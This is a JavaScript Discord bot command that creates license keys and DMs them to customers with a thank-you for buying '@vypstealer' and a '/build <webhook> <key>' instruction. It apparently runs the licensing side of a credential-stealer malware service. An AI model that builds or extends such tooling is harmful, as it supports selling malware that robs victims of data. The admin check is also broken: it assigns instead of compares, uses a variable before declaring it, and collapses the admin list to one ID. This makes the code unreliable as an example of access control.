const { PermissionFlagsBits, Client, EmbedBuilder, ApplicationCommandType, ApplicationCommandOptionType } = require("discord.js");
const config = require('./../../../settings/config.js');
const profiles = require('./../../../tables/profiles.js');
const randomstring = require('randomstring');
const mongoose = require('mongoose');
// const axios = require("axios").default;

module.exports = {
    name: "createkey",
    description: `createkey command of @vypbot`,
    userPermissions: PermissionFlagsBits.SendMessages,
    botPermissions: PermissionFlagsBits.SendMessages,
    category: "developer",
    type: ApplicationCommandType.ChatInput,

    options: [
        {
            name: 'user',
            description: 'You must enter a user!',
            type: ApplicationCommandOptionType.Mentionable,
            required: true
        }
    ],

    /**
     *
     * @param {Client} client
     * @param {CommandInteraction} inter
     */
    run: async (client, inter) => {

        if (inter.member.id = !botAdmins) return inter.reply({ content: "**What did u tried ?** :eyes: You must be a bot admin to use this command" });

        const user_id = inter.options.get('user').value;
        const member = await inter.client.users.fetch(user_id);
        const botAdmins = config.developers.ids.adm1 || config.developers.ids.adm2 || config.developers.ids.adm3 || config.developers.ids.adm4 || config.developers.ids.adm5 || config.developers.ids.adm6 || config.developers.ids.adm7 || config.developers.ids.adm8 || config.developers.ids.adm9 || config.developers.ids.adm10;  


        if (!user_id) {
            return inter.reply({ content: "Invalid arguments! Use: /createkey <customerid>", ephemeral: true });

        } else {
            if (inter.member.id == botAdmins) {
                const USERID = user_id;
                const KEY = "vyp-" + randomstring.generate(16);

                const alreadyExists = await profiles.exists({userid: USERID});
 
                if (alreadyExists) {
                    return inter.reply({ content: "User has already a key, try to find it in database or delete his data, then recreate a new key", ephemeral: false });

                } else if (!alreadyExists) {
                    let newData = new profiles({
                    userid: USERID,
                    key: KEY,
                    });
                    newData.save().then();

                    member.send(`Thanks for buying **@vypstealer**! Here is your key \`${newData.key}\` :eyes: \nUse: \`/build <webhook> <key>\``)
                    inter.reply(`See your DMs <@${user_id}> :eyes:`)

                    const createkey_log = new EmbedBuilder()
                    createkey_log.setAuthor({ name: 'CREATEKEY LOG' })
                    createkey_log.setColor('#2f3136')
                    createkey_log.addFields(
                        { name: "Customer:", value: `<@${USERID}> \`(${USERID})\``, inline: false },
                        { name: "Key:", value: `|| ${KEY} ||`, inline: false },
                        )
                    createkey_log.setTimestamp()
                    createkey_log.setFooter({ text: config.embed.footer })

                    let createkey_log_channel = client.channels.cache.get(config.server.channelkey_log);
                    createkey_log_channel.send({ embeds: [createkey_log] });

                }
            } else {
                return inter.reply({ content: "What did u tried ? You can't create a key without being a bot admin", ephemeral: false });
            }
        }
    }
};